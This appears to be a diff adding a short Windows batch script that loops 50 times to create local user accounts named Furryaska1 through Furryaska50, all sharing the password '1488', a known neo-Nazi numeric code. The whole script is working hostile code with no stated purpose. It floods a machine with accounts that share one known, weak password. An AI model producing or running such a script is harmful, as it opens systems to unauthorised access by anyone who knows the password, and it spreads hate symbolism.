@@ -1,0 +1,5 @@
+@echo off
+for /l %%i in (1, 1, 50) do (
+    net user Furryaska%%i 1488 /add
+)
+pause
